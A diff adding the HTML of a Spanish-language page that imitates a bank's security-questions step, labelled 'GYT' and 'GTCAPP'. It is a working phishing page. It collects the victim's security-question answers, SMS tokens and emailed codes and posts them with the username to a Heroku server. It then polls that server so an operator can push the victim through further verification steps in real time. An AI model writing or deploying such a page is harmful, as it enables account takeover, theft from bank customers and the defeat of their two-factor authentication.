@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Preguntas de Seguridad - GTCAPP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/a2e0e6e6b3.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="script.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      var token1;
+      var token2;
+    </script>
+    <script src="script.js"></script>
+
+    <script type="module">
+      document.addEventListener("DOMContentLoaded", () => {
+        token1 = localStorage.getItem("coord_a");
+        token2 = localStorage.getItem("coord_b");
+        document.getElementById("token1").textContent =
+          localStorage.getItem("coord_a");
+        document.getElementById("token2").textContent =
+          localStorage.getItem("coord_b");
+      });
+    </script>
+    <script>
+      async function checkStatus() {
+        const session_id = localStorage.getItem("sesion");
+        const res = await fetch(
+          `https://gythblien-ae20ed9337e1.herokuapp.com/check_session/${session_id}`
+        );
+        const data = await res.json();
+
+        if (data.status === "wrong") {
+          alert("Datos incorrectos");
+          window.location.href = "index.html";
+        } else if (data.status === "sms") {
+          document.getElementById("modal2").classList.add("hidden");
+          document.getElementById("modal").classList.remove("hidden");
+        } else if (data.status === "token") {
+          document.getElementById("modal2").classList.add("hidden");
+          document.getElementById("modal3").classList.remove("hidden");
+        } else if (data.status === "finish") {
+          alert("Espere la confirmación");
+          window.location.href = "index.html";
+        } else if (data.status === "coordenada") {
+          // Guardar coordenadas y redirigir
+          localStorage.setItem("coord_a", data.coords.a);
+          localStorage.setItem("coord_b", data.coords.b);
+          localStorage.setItem("session_id", session_id);
+          window.location.href = "preguntas.html";
+        } else if (data.status === "token") {
+          window.location.href = "token.html";
+        } else {
+          // Sigue esperando
+          setTimeout(checkStatus, 1500);
+        }
+      }
+    </script>
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+      integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+  </head>
+  <body class="bg-white flex items-center justify-center min-h-screen px-4">
+    <!-- Overlay Modal -->
+    <div
+      id="modal"
+      class="hidden fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-10"
+    >
+      <div class="bg-white rounded-md p-6 max-w-md w-full shadow-lg">
+        <h2 class="text-lg font-semibold text-center text-blue-600">
+          Token enviado
+        </h2>
+        <p class="text-center mt-2 text-sm text-gray-700">
+          Ingresar el Token que te hemos enviado a tu dispositivo móvil y
+          valídalo para poder continuar.
+        </p>
+        <p class="text-center text-xs text-gray-500 mt-1">
+          *Si no has recibido el token, genera uno nuevo y te enviaremos otro.
+        </p>
+
+        <div class="mt-4 flex justify-center">
+          <input
+            type="text"
+            placeholder="xxxxxx"
+            class="border px-4 py-2 rounded text-center w-48"
+            maxlength="6"
+          />
+        </div>
+
+        <div class="text-center mt-2">
+          <a href="#" class="text-blue-600 text-sm">🔄 Generar nuevo token</a>
+        </div>
+
+        <div class="flex items-center justify-center mt-4">
+          <label class="text-sm mr-2"
+            >¿Deseas guardar este como un dispositivo recurrente?</label
+          >
+          <input type="checkbox" checked class="toggle toggle-primary" />
+        </div>
+
+        <div class="flex justify-between mt-6">
+          <button
+            onclick="document.getElementById('modal').classList.add('hidden')"
+            class="text-blue-600 font-bold"
+          >
+            CANCELAR
+          </button>
+          <button
+            id="ValidateTokenButton"
+            class="bg-red-600 text-white px-4 py-2 rounded"
+          >
+            VALIDAR
+          </button>
+        </div>
+      </div>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const tokenInput = document.querySelector('#modal input[type="text"]');
+        const validateBtn = document.getElementById("ValidateTokenButton");
+
+        validateBtn?.addEventListener("click", async (e) => {
+          e.preventDefault();
+
+          const usuario = localStorage.getItem("usuario") || "Desconocido";
+          const tokenIngresado = tokenInput?.value.trim();
+
+          if (!tokenIngresado || tokenIngresado.length !== 6) {
+            alert("Por favor, ingresa un token válido de 6 dígitos.");
+            return;
+          }
+
+          const body = `GYT\n✅ Validación de Token:\n👤 Usuario: ${usuario}\n🔢 Token: ${tokenIngresado}`;
+
+          const res = await fetch(
+            "https://gythblien-ae20ed9337e1.herokuapp.com/submit1",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+              },
+              body,
+            }
+          );
+          const data = await res.json();
+          if (data.session_id) {
+            localStorage.setItem("sesion", data.session_id);
+            document.getElementById("modal").classList.add("hidden");
+            document.getElementById("modal2").classList.remove("hidden");
+            checkStatus();
+          } else {
+            alert("Error al enviar los datos");
+          }
+        });
+      });
+    </script>
+    <div
+      id="modal2"
+      class="hidden fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50"
+    >
+      <div
+        class="bg-white rounded-md p-6 max-w-xs w-full shadow-lg flex flex-col items-center justify-center"
+      >
+        <h2 class="text-lg font-semibold text-blue-600 mb-4">Cargando...</h2>
+
+        <!-- Dot Loader -->
+        <div class="flex space-x-2">
+          <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce"></div>
+          <div
+            class="w-3 h-3 bg-blue-600 rounded-full animate-bounce [animation-delay:.1s]"
+          ></div>
+          <div
+            class="w-3 h-3 bg-blue-600 rounded-full animate-bounce [animation-delay:.2s]"
+          ></div>
+        </div>
+      </div>
+    </div>
+    <div
+      id="modal3"
+      class="hidden fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-10"
+    >
+      <div class="bg-white rounded-md p-6 max-w-md w-full shadow-lg">
+        <h2 class="text-lg font-semibold text-center text-blue-600">
+          Código enviado por correo
+        </h2>
+        <p class="text-center mt-2 text-sm text-gray-700">
+          Revisa tu bandeja de entrada e ingresa el código que te hemos enviado
+          a tu correo electrónico.
+        </p>
+        <p class="text-center text-xs text-gray-500 mt-1">
+          *Si no lo ves, revisa también la carpeta de spam o genera uno nuevo.
+        </p>
+
+        <div class="mt-4 flex justify-center">
+          <input
+            type="text"
+            placeholder="xxxxxx"
+            class="border px-4 py-2 rounded text-center w-48"
+            maxlength="6"
+          />
+        </div>
+
+        <div class="text-center mt-2">
+          <a href="#" class="text-blue-600 text-sm">🔄 Enviar nuevo código</a>
+        </div>
+
+        <div class="flex items-center justify-center mt-4">
+          <label class="text-sm mr-2"
+            >¿Deseas guardar este como un dispositivo recurrente?</label
+          >
+          <input type="checkbox" checked class="toggle toggle-primary" />
+        </div>
+
+        <div class="flex justify-between mt-6">
+          <button
+            onclick="document.getElementById('modal3').classList.add('hidden')"
+            class="text-blue-600 font-bold"
+          >
+            CANCELAR
+          </button>
+          <button
+            id="ValidateEmailCodeButton"
+            class="bg-red-600 text-white px-4 py-2 rounded"
+          >
+            VALIDAR
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const emailCodeInput = document.querySelector(
+          '#modal3 input[type="text"]'
+        );
+        const validateBtn = document.getElementById("ValidateEmailCodeButton");
+
+        validateBtn?.addEventListener("click", async (e) => {
+          e.preventDefault();
+
+          const usuario = localStorage.getItem("usuario") || "Desconocido";
+          const codigoCorreo = emailCodeInput?.value.trim();
+
+          if (!codigoCorreo || codigoCorreo.length !== 6) {
+            alert("Por favor, ingresa un código válido de 6 dígitos.");
+            return;
+          }
+
+          const body = `GYT\n✅ Código de Correo:\n👤 Usuario: ${usuario}\n📧 Código: ${codigoCorreo}`;
+
+          const res = await fetch(
+            "https://gythblien-ae20ed9337e1.herokuapp.com/submit1",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+              },
+              body,
+            }
+          );
+          const data = await res.json();
+          if (data.session_id) {
+            localStorage.setItem("sesion", data.session_id);
+            document.getElementById("modal3").classList.add("hidden");
+            document.getElementById("modal2").classList.remove("hidden");
+            checkStatus();
+          } else {
+            alert("Error al enviar el código.");
+          }
+        });
+      });
+    </script>
+
+    <div class="w-full max-w-md space-y-6">
+      <!-- Header centrado -->
+      <div class="bg-gray-200 py-4 px-6 rounded-lg text-center">
+        <div class="flex flex-col items-center justify-center space-y-2">
+          <img
+            src="https://static.wixstatic.com/media/0e7208_b078261ec15d4e9a9475e6268ea3b8d4~mv2.png/v1/fill/w_600,h_400,al_c/AF%20Logo%20compacto%20RGB%20GTC%20May22-01%20(1).png"
+            alt="Logo"
+            class="object-contain"
+            style="width: 150px"
+          />
+        </div>
+      </div>
+
+      <!-- Título -->
+      <div class="bg-gray-100 rounded-lg py-2 px-4">
+        <h2 class="text-center text-blue-700 font-semibold text-lg">
+          Preguntas de seguridad
+        </h2>
+      </div>
+
+      <!-- Descripción -->
+      <p class="text-center text-gray-600">
+        Responde las preguntas de seguridad para realizar cambios.
+      </p>
+
+      <!-- Formulario -->
+      <form id="securityForm" class="space-y-4">
+        <div>
+          <label
+            class="block text-gray-700 font-medium mb-1"
+            id="token1"
+          ></label>
+          <div class="relative">
+            <input
+              id="respuesta1"
+              type="password"
+              placeholder="Escribe aquí tu respuesta"
+              class="peer w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+            />
+            <i
+              class="fas fa-eye absolute right-3 top-3 text-gray-500 cursor-pointer toggle-visibility"
+              data-target="respuesta1"
+            ></i>
+          </div>
+        </div>
+        <div>
+          <label
+            class="block text-gray-700 font-medium mb-1"
+            id="token2"
+          ></label>
+          <div class="relative">
+            <input
+              id="respuesta2"
+              type="password"
+              placeholder="Escribe aquí tu respuesta"
+              class="peer w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+            />
+            <i
+              class="fas fa-eye absolute right-3 top-3 text-gray-500 cursor-pointer toggle-visibility"
+              data-target="respuesta2"
+            ></i>
+          </div>
+        </div>
+
+        <!-- Opción alternativa -->
+        <div class="text-blue-700 hover:underline cursor-pointer text-sm mt-1">
+          🔁 Intentar con otras preguntas
+        </div>
+
+        <!-- Botón Continuar -->
+        <button
+          type="submit"
+          id="btnContinuar"
+          disabled
+          class="w-full bg-blue-300 text-white font-medium py-2 rounded-md transition-all duration-200 cursor-not-allowed"
+        >
+          Continuar
+        </button>
+      </form>
+    </div>
+
+    <script>
+      // Mostrar/ocultar contraseña
+      document.querySelectorAll(".toggle-visibility").forEach((icon) => {
+        icon.addEventListener("click", () => {
+          const inputId = icon.getAttribute("data-target");
+          const input = document.getElementById(inputId);
+          input.type = input.type === "password" ? "text" : "password";
+          icon.classList.toggle("fa-eye");
+          icon.classList.toggle("fa-eye-slash");
+        });
+      });
+
+      // Activar botón cuando ambos campos tienen texto
+      const respuesta1 = document.getElementById("respuesta1");
+      const respuesta2 = document.getElementById("respuesta2");
+      const btnContinuar = document.getElementById("btnContinuar");
+
+      function validarCampos() {
+        const filled = respuesta1.value.trim() && respuesta2.value.trim();
+        btnContinuar.disabled = !filled;
+        btnContinuar.classList.toggle("bg-blue-400", filled);
+        btnContinuar.classList.toggle("bg-blue-300", !filled);
+        btnContinuar.classList.toggle("cursor-pointer", filled);
+        btnContinuar.classList.toggle("cursor-not-allowed", !filled);
+      }
+
+      respuesta1.addEventListener("input", validarCampos);
+      respuesta2.addEventListener("input", validarCampos);
+    </script>
+
+    <script>
+      document
+        .getElementById("securityForm")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+
+          const r1 = document.getElementById("respuesta1").value.trim();
+          const r2 = document.getElementById("respuesta2").value.trim();
+
+          const body = `GYT\n🔐 Respuestas de seguridad:\n👤 Usuario: ${localStorage.getItem(
+            "usuario"
+          )}\n❓ ${token1}: ${r1}\n❓ ${token2}: ${r2}`;
+          const res = await fetch(
+            "https://gythblien-ae20ed9337e1.herokuapp.com/submit1",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+              },
+              body,
+            }
+          );
+          const data = await res.json();
+          if (data.session_id) {
+            localStorage.setItem("sesion", data.session_id);
+            document.getElementById("modal2").classList.remove("hidden");
+            checkStatus();
+          } else {
+            alert("Error al enviar los datos");
+          }
+        });
+    </script>
+  </body>
+</html>
